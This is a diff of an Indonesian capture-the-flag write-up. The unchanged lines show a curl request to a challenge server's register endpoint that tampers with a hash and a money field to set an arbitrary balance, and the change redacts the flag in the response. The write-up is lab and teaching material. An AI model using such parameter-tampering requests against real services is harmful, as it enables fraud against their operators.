@@ -74,4 +74,4 @@ jadi kita bisa langsung kirim ke register dan atur duitnya sesuka kita :
 `curl 'http://q6.ctf.katsudon.org/register' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' --data 'h=c8c605999f3d8352d7bb792cf3fdb25b&money=999999999' --compressed`
 
 flag bakal muncul di response nya 
-`{"message":"Congrats! The flag is "YIPPEE"."}`
+`{"message":"Congrats! The flag is "XXXXXXXXX"."}`
